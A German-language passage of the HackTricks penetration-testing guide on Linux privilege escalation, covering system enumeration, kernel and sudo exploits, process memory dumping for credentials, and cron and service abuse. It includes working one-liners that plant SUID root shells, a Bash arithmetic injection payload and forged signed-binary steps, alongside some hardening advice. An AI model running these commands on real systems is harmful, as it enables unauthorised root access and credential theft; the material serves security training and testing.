# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Systeminformationen

### OS-Informationen

Beginnen wir damit, einige Informationen über das laufende OS zu sammeln
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn du **Schreibrechte für einen beliebigen Ordner innerhalb der Variable `PATH`** hast, kannst du möglicherweise einige Bibliotheken oder Binaries kapern:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel-Exploits

Überprüfe die Kernel-Version und ob es einen Exploit gibt, der zur Rechteausweitung verwendet werden kann.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Eine gute Liste mit verwundbaren Kernel-Versionen und einigen bereits **compilierten Exploits** findest du hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) sowie bei [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Websites, auf denen du einige **compilierte Exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Website zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel exploits helfen könnten, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (IN victim ausführen, prüft nur exploits für Kernel 2.x)

**Suche immer nach der Kernel-Version in Google**, vielleicht ist deine Kernel-Version in einem Kernel exploit enthalten, und dann kannst du sicher sein, dass dieser exploit gültig ist.

Zusätzliche Kernel exploitation techniques:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den verwundbaren Sudo-Versionen, die in:
```bash
searchsploit sudo
```
Du kannst mithilfe dieses grep-Befehls prüfen, ob die sudo-Version verwundbar ist.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) ermöglichen es unprivilegierten lokalen Benutzern, ihre Privilegien über die sudo-Option `--chroot` auf root zu erweitern, wenn die Datei `/etc/nsswitch.conf` aus einem von einem Benutzer kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Stelle vor dem Ausführen des Exploits sicher, dass deine `sudo`-Version verwundbar ist und die `chroot`-Funktion unterstützt.

Weitere Informationen findest du in der ursprünglichen [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Umgehung hostbasierter Sudo-Regeln (CVE-2025-32462)

Sudo vor 1.9.17p1 (gemeldeter betroffener Bereich: **1.8.8–1.9.17**) kann hostbasierte sudoers-Regeln anhand des **vom Benutzer bereitgestellten Hostnamens** aus `sudo -h <host>` statt anhand des **echten Hostnamens** auswerten. Wenn sudoers auf einem anderen Host umfassendere Berechtigungen gewährt, kannst du diesen Host lokal **spoofen**.

Voraussetzungen:
- Verwundbare sudo-Version
- Host-spezifische sudoers-Regeln (der Host ist weder der aktuelle Hostname noch `ALL`)

Beispiel für ein sudoers-Muster:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Durch Spoofing des erlaubten Hosts ausnutzen:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Wenn die Auflösung des gefälschten Namens blockiert, füge ihn zu `/etc/hosts` hinzu oder verwende einen Hostnamen, der bereits in Logs/Configs vorkommt, um DNS-Lookups zu vermeiden.

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-Signaturüberprüfung fehlgeschlagen

Siehe die **smasher2-Box von HTB** für ein **Beispiel**, wie diese Schwachstelle ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere Systemaufklärung
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Schutzmaßnahmen ermitteln

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Wenn du dich innerhalb eines Containers befindest, beginne mit dem folgenden Abschnitt zur Container-Security und wechsle anschließend zu den Runtime-spezifischen Abuse-Seiten:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Laufwerke

Prüfe, **was gemountet und ungemountet ist**, wo und warum. Wenn etwas ungemountet ist, könntest du versuchen, es zu mounten und auf private Informationen zu prüfen.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binaries auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Prüfe außerdem, ob **ein Compiler installiert ist**. Das ist nützlich, wenn du einen Kernel-Exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn verwenden wirst (oder auf einer ähnlichen).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfe die **Version der installierten Pakete und Dienste**. Möglicherweise ist eine alte Nagios-Version installiert, die beispielsweise zur Rechteausweitung ausgenutzt werden könnte…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, könntest du auch **openVAS** verwenden, um nach veralteter und verwundbarer Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle sehr viele Informationen anzeigen, von denen der größte Teil nutzlos sein wird. Daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die prüfen, ob eine Version der installierten Software für bekannte Exploits verwundbar ist._

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und prüfe, ob ein Prozess **mehr Berechtigungen als vorgesehen** besitzt (wird beispielsweise Tomcat von root ausgeführt?).
```bash
ps aux
ps -ef
top -n 1
```
Überprüfe immer, ob **electron/cef/chromium debuggers** laufen, da du sie zur Rechteausweitung missbrauchen könntest](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** erkennt diese, indem es den Parameter `--inspect` in der Befehlszeile des Prozesses überprüft.\
Überprüfe außerdem deine **Berechtigungen für die Binärdateien der Prozesse**; möglicherweise kannst du eine davon überschreiben.

### Eltern-Kind-Ketten zwischen Benutzern

Ein Child-Prozess, der unter einem **anderen Benutzer** als sein Parent-Prozess läuft, ist nicht automatisch bösartig, aber ein nützliches **Triage-Signal**. Einige Übergänge sind erwartbar (`root`, der einen Dienstbenutzer startet, oder Login-Manager, die Session-Prozesse erstellen), doch ungewöhnliche Ketten können Wrapper, Debug-Hilfsprogramme, Persistenz oder schwache Vertrauensgrenzen der Laufzeitumgebung aufdecken.

Schnellüberprüfung:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Wenn du eine überraschende Kette findest, untersuche die übergeordnete Befehlszeile und alle Dateien, die ihr Verhalten beeinflussen (`config`, `EnvironmentFile`, Helper-Skripte, Arbeitsverzeichnis, schreibbare Argumente). Bei mehreren realen privesc-Pfaden war nicht das **child** selbst schreibbar, sondern die vom **parent** kontrollierte `config` oder Helper-Kette.

### Gelöschte Executables und gelöschte geöffnete Dateien

Laufzeit-Artefakte sind oft auch **nach dem Löschen** noch zugänglich. Das ist sowohl für Privilege Escalation als auch zur Wiederherstellung von Beweisen aus einem Prozess nützlich, der bereits sensible Dateien geöffnet hat.

Suche nach gelöschten Executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Wenn `/proc/<PID>/exe` auf `(deleted)` verweist, führt der Prozess weiterhin das alte Binärabbild aus dem Speicher aus. Das ist ein starkes Signal für weitere Untersuchungen, weil:

- die entfernte ausführbare Datei interessante Zeichenketten oder Zugangsdaten enthalten kann
- der laufende Prozess weiterhin nützliche Datei-Deskriptoren bereitstellen kann
- eine gelöschte privilegierte Binärdatei auf kürzlich erfolgte Manipulationen oder einen versuchten Cleanup hindeuten kann

Sammle global gelöschte, noch geöffnete Dateien:
```bash
lsof +L1
```
Wenn du einen interessanten Descriptor findest, stelle ihn direkt wieder her:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Dies ist besonders wertvoll, wenn ein Prozess noch ein gelöschtes Secret, Script, Datenbankexport oder eine Flag-Datei geöffnet hat.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Dies kann sehr nützlich sein, um verwundbare Prozesse zu identifizieren, die regelmäßig ausgeführt werden oder sobald eine Reihe von Voraussetzungen erfüllt ist.

### Prozessspeicher

Einige Services eines Servers speichern **Credentials im Klartext innerhalb des Speichers**.\
Normalerweise benötigst du **root-Rechte**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören. Daher ist dies meist nützlicher, wenn du bereits root bist und weitere Credentials finden möchtest.\
Denke jedoch daran, dass du **als regulärer Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass die meisten Computer heutzutage **ptrace standardmäßig nicht erlauben**. Das bedeutet, dass du keine anderen Prozesse dumpen kannst, die deinem unprivilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, sofern sie dieselbe uid haben. Dies ist die klassische Funktionsweise von ptrace.
> - **kernel.yama.ptrace_scope = 1**: Nur ein übergeordneter Prozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur ein Admin kann ptrace verwenden, da dafür die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace überwacht werden. Sobald dieser Wert gesetzt wurde, ist ein Neustart erforderlich, um ptrace wieder zu aktivieren.

#### GDB

Wenn du beispielsweise Zugriff auf den Speicher eines FTP-Services hast, könntest du den Heap auslesen und darin nach seinen Credentials suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine bestimmte Prozess-ID zeigt **maps, wie der Speicher innerhalb des virtuellen Adressraums dieses Prozesses** abgebildet ist; außerdem zeigt es die **Berechtigungen jeder abgebildeten Region**. Die **mem**-Pseudodatei **legt den Speicher des Prozesses selbst offen**. Anhand der **maps**-Datei wissen wir, welche **Speicherregionen lesbar** sind und welche Offsets sie besitzen. Wir verwenden diese Informationen, um in der mem-Datei an die entsprechenden Stellen zu springen und alle lesbaren Regionen in eine Datei zu dumpen.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` ermöglicht den Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann mit /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Linux-Neuimplementierung des klassischen ProcDump-Tools aus der Sysinternals-Tool-Suite für Windows. Du findest es unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Um den Speicher eines Prozesses zu dumpen, kannst du Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst die root-Anforderungen manuell entfernen und den Prozess dumpen, der dir gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Zugangsdaten aus dem Prozessspeicher

#### Manuelles Beispiel

Wenn du feststellst, dass der Authentifizierungsprozess ausgeführt wird:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zum Dumpen des Speichers eines Prozesses zu finden) und im Speicher nach Credentials suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) wird **Klartext-Zugangsdaten aus dem Speicher stehlen** sowie aus einigen **bekannten Dateien**. Für eine ordnungsgemäße Funktion sind Root-Rechte erforderlich.

| Funktion                                           | Process Name         |
| ------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                  | vsftpd               |
| Apache2 (aktive HTTP-Basic-Auth-Sitzungen)        | apache2              |
| OpenSSH (aktive SSH-Sitzungen – Sudo-Nutzung)     | sshd:                |

#### Such-Regexe/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher), ausgeführt als root – webbasierter Scheduler-privesc

Wenn ein Web-„Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an loopback gebunden ist, kannst du es dennoch über SSH Local Port Forwarding erreichen und einen privilegierten Job zur Eskalation erstellen.

Typische Angriffskette
- Einen nur an loopback gebundenen Port (z. B. 127.0.0.1:8000) und den Basic-Auth-Realm über `ss -ntlp` / `curl -v localhost:8000` ermitteln
- Credentials in betrieblichen Artefakten finden:
- Backups/Skripte mit `zip -P <password>`
- systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` offenlegt
- Tunnel erstellen und anmelden:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Job mit hohen Privilegien erstellen und sofort ausführen (legt eine SUID-Shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwenden Sie es:
```bash
/tmp/rootshell -p   # root shell
```
Härtung
- Crontab UI nicht als root ausführen; mit einem dedizierten Benutzer und minimalen Berechtigungen einschränken
- An localhost binden und den Zugriff zusätzlich per Firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Keine Secrets in Unit-Dateien einbetten; Secret Stores oder eine nur für root lesbare EnvironmentFile verwenden
- Audit/Logging für On-Demand-Jobausführungen aktivieren



Prüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ausnutzen, dass ein Script von root ausgeführt wird (Wildcard vuln? Kannst du Dateien ändern, die root verwendet? Symlinks verwenden? Bestimmte Dateien in dem Verzeichnis erstellen, das root verwendet?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Wenn `run-parts` verwendet wird, prüfe, welche Namen tatsächlich ausgeführt werden:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Dies vermeidet False Positives. Ein beschreibbares periodisches Verzeichnis ist nur nützlich, wenn dein Payload-Dateiname den lokalen `run-parts`-Regeln entspricht.

### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer „user“ Schreibrechte für /home/user besitzt_)

Wenn der root-Benutzer innerhalb dieser Crontab versucht, einen Befehl oder ein Script auszuführen, ohne den Pfad festzulegen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine root shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Script unter Verwendung eines Wildcards (Wildcard Injection)

Wenn ein von root ausgeführtes Script ein „**\***“ innerhalb eines Befehls enthält, könntest du dies ausnutzen, um unerwartete Dinge (wie privesc) zu erreichen. Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn dem wildcard ein Pfad wie** _**/some/path/\***_ **vorangestellt ist, ist es nicht anfällig (nicht einmal** _**./\***_ **).**

Lies die folgende Seite für weitere Tricks zur Ausnutzung von wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injektion durch Bash arithmetic expansion in cron log parsers

Bash führt parameter expansion und command substitution vor der arithmetic evaluation in ((...)), $((...)) und let aus. Wenn ein root cron/parser nicht vertrauenswürdige Log-Felder liest und sie in einen arithmetic context einfügt, kann ein Angreifer eine command substitution $(...) einschleusen, die als root ausgeführt wird, wenn cron läuft.

- Warum es funktioniert: In Bash erfolgen expansions in dieser Reihenfolge: parameter/variable expansion, command substitution, arithmetic expansion, anschließend word splitting und pathname expansion. Daher wird ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` zuerst substituiert (wodurch der Befehl ausgeführt wird), anschließend wird die verbleibende numerische `0` für die arithmetic verwendet, sodass das Script ohne Fehler fortgesetzt wird.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Schreibe vom Angreifer kontrollierten Text in das geparste Log, sodass das numerisch aussehende Feld eine command substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite die Ausgabe um), damit die arithmetic gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Überschreiben von Cron-Scripts und symlink

Wenn du **ein von root ausgeführtes Cron-Script ändern kannst**, kannst du sehr einfach eine Shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von **root** ausgeführte Script ein **Verzeichnis verwendet, auf das du vollständigen Zugriff hast**, könnte es möglicherweise nützlich sein, diesen Ordner zu löschen und **ein Symlink-Verzeichnis zu einem anderen Ordner zu erstellen**, das ein von dir kontrolliertes Script bereitstellt.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-Validierung und sicherere Dateiverarbeitung

Bei der Überprüfung privilegierter Scripts/Binaries, die Dateien anhand ihres Pfads lesen oder schreiben, sollte geprüft werden, wie mit Links umgegangen wird:

- `stat()` folgt einem Symlink und gibt Metadaten des Ziels zurück.
- `lstat()` gibt Metadaten des Links selbst zurück.
- `readlink -f` und `namei -l` helfen dabei, das endgültige Ziel aufzulösen und die Berechtigungen jeder Pfadkomponente anzuzeigen.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Für Defenders/Developers gehören zu sichereren Vorgehensweisen gegen Symlink-Tricks:

- `O_EXCL` mit `O_CREAT`: schlägt fehl, wenn der Pfad bereits existiert (blockiert vom Angreifer vorab erstellte Links/Dateien).
- `openat()`: arbeitet relativ zu einem vertrauenswürdigen Verzeichnis-File-Descriptor.
- `mkstemp()`: erstellt temporäre Dateien atomar mit sicheren Berechtigungen.

### Benutzerdefinierte signierte cron binaries mit beschreibbaren Payloads

Blue teams "signieren" cron-gesteuerte binaries manchmal, indem sie einen benutzerdefinierten ELF-Abschnitt extrahieren und vor deren Ausführung als root nach einem Hersteller-String suchen. Wenn dieses binary gruppenbeschreibbar ist (z. B. `/opt/AV/periodic-checks/monitor`, im Besitz von `root:devs 770`) und du das signing material leaken kannst, kannst du den Abschnitt fälschen und den cron task hijacken:

1. Verwende `pspy`, um den verification flow aufzuzeichnen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` aus und startete anschließend die Datei.
2. Erstelle das erwartete certificate mit dem geleakten key/config aus `signing.zip` neu:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Erstelle einen malicious replacement (z. B. lege eine SUID bash ab oder füge deinen SSH key hinzu) und bette das certificate in `.text_sig` ein, damit `grep` erfolgreich ist:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das scheduled binary und behalte dabei die execute bits bei:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten cron run. Sobald der naive signature check erfolgreich ist, wird dein payload als root ausgeführt.

### Häufige cron jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die alle 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du dies ausnutzen und deine Privilegien eskalieren.

Um beispielsweise **1 Minute lang alle 0,1 s zu überwachen**, nach **am seltensten ausgeführten commands zu sortieren** und die am häufigsten ausgeführten commands zu löschen, kannst du Folgendes ausführen:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **verwenden** (dies überwacht und listet jeden gestarteten Prozess auf).

### Root-Backups, die vom Angreifer gesetzte Mode-Bits beibehalten (pg_basebackup)

Wenn ein Root-eigener Cronjob `pg_basebackup` (oder eine rekursive Kopie) für ein Datenbankverzeichnis ausführt, in das du schreiben kannst, kannst du eine **SUID/SGID-Binary** platzieren, die mit denselben Mode-Bits als **root:root** in das Backup-Ziel kopiert wird.

Typischer Ablauf zur Aufklärung (als Benutzer mit geringen Rechten für die Datenbank):
- Verwende `pspy`, um einen Root-Cronjob zu entdecken, der beispielsweise jede Minute etwas wie `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` aufruft.
- Bestätige, dass der Quell-Cluster (z. B. `/var/lib/postgresql/14/main`) für dich beschreibbar ist und das Ziel (`/opt/backups/current`) nach dem Job Root gehört.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Dies funktioniert, weil `pg_basebackup` beim Kopieren des Clusters die Datei-Modusbits beibehält; wenn der Befehl von root ausgeführt wird, übernehmen die Zieldateien **root-Eigentümerschaft + vom Angreifer gewählte SUID/SGID**. Jede ähnliche privilegierte Backup-/Kopierroutine, die Berechtigungen beibehält und in einen ausführbaren Speicherort schreibt, ist anfällig.

### Unsichtbare cron jobs

Es ist möglich, einen cronjob zu erstellen, indem **nach einem Kommentar ein Wagenrücklauf eingefügt wird** (ohne Newline-Zeichen). Der cron job funktioniert dann trotzdem. Beispiel (beachte das Wagenrücklauf-Zeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Um diese Art von Stealth Entry zu erkennen, untersuche Cron-Dateien mit Tools, die Steuerzeichen sichtbar machen:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Dienste

### Beschreibbare _.service_-Dateien

Prüfe, ob du in eine `.service`-Datei schreiben kannst. Falls dies möglich ist, **könntest du sie ändern**, sodass sie deine **backdoor ausführt, wenn** der Dienst **gestartet**, **neu gestartet** oder **beendet** wird (möglicherweise musst du warten, bis die Maschine neu gestartet wird).\
Erstelle deine backdoor beispielsweise innerhalb der .service-Datei mit **`ExecStart=/tmp/script.sh`**

### Beschreibbare Dienst-Binaries

Beachte, dass du Binaries, die von Diensten ausgeführt werden, durch backdoors ersetzen kannst, wenn du **Schreibberechtigungen für diese Binaries besitzt**. Dadurch werden die backdoors ausgeführt, sobald die Dienste erneut ausgeführt werden.

